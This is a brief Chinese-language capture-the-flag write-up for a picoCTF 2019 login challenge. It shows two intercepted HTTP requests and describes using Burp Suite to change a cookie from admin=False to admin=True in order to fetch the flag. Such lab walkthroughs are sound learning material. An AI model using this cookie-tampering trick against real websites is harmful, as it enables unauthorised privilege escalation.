使用burpsuite可以看但有重定向的过程，所以第一个包放过，抓到第二个包，将admin=False改为admin=True  
  
第一次发包：  
POST /problem/21895/login HTTP/1.1
Host: 2019shell1.picoctf.com
Connection: close
Content-Length: 31
Cache-Control: max-age=0
Origin: https://2019shell1.picoctf.com
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Sec-Fetch-Site: same-origin
Referer: https://2019shell1.picoctf.com/problem/21895/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _ga=GA1.2.1422344254.155643409; _gid=GA1.2.39760068.156123219; _gat_gtag_UA_967658343_4=1

user=logon&password=
  
  
第二次发包： 

GET /flag HTTP/1.1  
Host: 2019shell1.picoctf.com  
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Sec-Fetch-Site: same-origin
Referer: https://2019shell1.picoctf.com/problem/21895/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _ga=GA1.2.1422344254.155643409; _gid=GA1.2.39760068.156123219; _gat_gtag_UA_12348343_4=1; password=; username=logon; admin=True

